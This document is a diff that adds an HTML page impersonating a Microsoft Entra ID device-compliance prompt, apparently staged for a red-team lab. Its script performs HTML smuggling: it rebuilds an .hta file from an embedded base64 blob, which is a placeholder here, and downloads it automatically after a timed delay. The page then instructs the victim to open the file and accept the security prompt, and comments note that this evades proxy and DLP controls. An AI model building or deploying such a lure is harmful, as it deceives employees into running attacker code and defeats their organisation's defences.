@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Compliance Required - Microsoft Entra ID</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+            padding: 40px 44px;
+            width: 100%;
+            max-width: 520px;
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+        .ms-logo span {
+            font-size: 15px;
+            font-weight: 600;
+            color: #323130;
+            letter-spacing: -0.2px;
+        }
+        .page-title {
+            font-size: 21px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 8px;
+        }
+        .page-sub {
+            font-size: 13.5px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .divider {
+            border: none;
+            border-top: 1px solid #edebe9;
+            margin: 20px 0;
+        }
+
+        .spinner-wrap {
+            text-align: center;
+            padding: 24px 0;
+        }
+        .spinner {
+            border: 3px solid #edebe9;
+            border-top-color: #0078d4;
+            border-radius: 50%;
+            width: 38px;
+            height: 38px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner-wrap p { font-size: 13px; color: #605e5c; }
+
+        .steps-wrap { display: none; }
+        .step {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        .step-badge {
+            width: 28px;
+            height: 28px;
+            min-width: 28px;
+            border-radius: 50%;
+            background: #0078d4;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+        }
+        .step-badge.done { background: #107c10; }
+        .step-body { flex: 1; }
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 6px;
+        }
+        .step-desc {
+            font-size: 13px;
+            color: #605e5c;
+            line-height: 1.5;
+        }
+
+        .dl-block {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f3f2f1;
+            border: 1px solid #d2d0ce;
+            border-radius: 3px;
+            padding: 10px 14px;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+        .dl-icon { font-size: 18px; }
+        .dl-name { font-weight: 600; color: #201f1e; flex: 1; }
+        .dl-status { font-size: 12px; color: #107c10; font-weight: 600; }
+
+        .kbd {
+            display: inline-flex;
+            align-items: center;
+            background: #f3f2f1;
+            border: 1px solid #c8c6c4;
+            border-radius: 3px;
+            padding: 1px 6px;
+            font-size: 11.5px;
+            font-family: 'Segoe UI', sans-serif;
+            color: #201f1e;
+            white-space: nowrap;
+        }
+
+        .notice {
+            font-size: 11.5px;
+            color: #a19f9d;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+        .notice a { color: #0078d4; text-decoration: none; }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #a19f9d;
+        }
+        .footer-links a { color: #a19f9d; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="ms-logo">
+        <svg width="22" height="22" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
+            <rect x="1"  y="1"  width="10" height="10" fill="#f25022"/>
+            <rect x="12" y="1"  width="10" height="10" fill="#7fba00"/>
+            <rect x="1"  y="12" width="10" height="10" fill="#00a4ef"/>
+            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+        </svg>
+        <span>Microsoft Entra ID</span>
+    </div>
+
+    <div class="spinner-wrap" id="spinner">
+        <div class="spinner"></div>
+        <p>Checking device compliance status...</p>
+    </div>
+
+    <div class="steps-wrap" id="main">
+        <h1 class="page-title">Device Compliance Update Required</h1>
+        <p class="page-sub">
+            Your organization's security policy requires this device to be marked
+            compliant before it can access corporate resources. Follow the two
+            steps below to continue.
+        </p>
+
+        <hr class="divider">
+
+        <div class="step">
+            <div class="step-badge done" id="badge1">&#10003;</div>
+            <div class="step-body">
+                <div class="step-title">Download the compliance file</div>
+                <div class="step-desc">
+                    The compliance file has been saved to your
+                    <strong>Downloads</strong> folder.
+                </div>
+                <div class="dl-block">
+                    <span class="dl-icon">&#128274;</span>
+                    <span class="dl-name">Essos_Compliance_Update.hta</span>
+                    <span class="dl-status">&#10003; Downloaded</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-badge" id="badge2">2</div>
+            <div class="step-body">
+                <div class="step-title">Apply the compliance policy</div>
+                <div class="step-desc">
+                    Open <strong>Essos_Compliance_Update.hta</strong> from your
+                    <strong>Downloads</strong> folder. If a security prompt appears,
+                    choose <span class="kbd">Open</span> to continue.
+                </div>
+            </div>
+        </div>
+
+        <p class="notice">
+            This process marks the device compliant in Intune.<br>
+            No data is collected. <a href="#">Privacy statement</a>
+        </p>
+    </div>
+</div>
+
+<div class="footer-links">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <a href="#">Contact</a>
+</div>
+
+<script>
+    // Lab staging: only serve payload on expected hostname
+    if (window.location.hostname !== '192.168.56.2') {
+        window.location.replace('https://login.microsoftonline.com/');
+    }
+
+    // T1027.006 - HTML Smuggling: the compliance file is reconstructed client-side
+    // from an embedded base64 blob. No HTTP request is issued for the .hta itself,
+    // so proxy/DLP controls that inspect file downloads by name or MIME type are bypassed.
+    function triggerDownload() {
+        var b64 = '@@HTA_B64@@';
+        var raw = atob(b64);
+        var arr = new Uint8Array(raw.length);
+        for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+        var blob = new Blob([arr], {type: 'application/octet-stream'});
+        var url  = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href     = url;
+        a.download = 'Essos_Compliance_Update.hta';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function() { document.body.removeChild(a); URL.revokeObjectURL(url); }, 300);
+    }
+
+    // T1678 - Delay Execution: fixed wait before the reveal/download
+    var REVEAL_DELAY_MS = 3000;
+
+    function revealPayloadUi() {
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('main').style.display = 'block';
+        triggerDownload();
+    }
+
+    setTimeout(revealPayloadUi, REVEAL_DELAY_MS);
+</script>
+</body>
+</html>
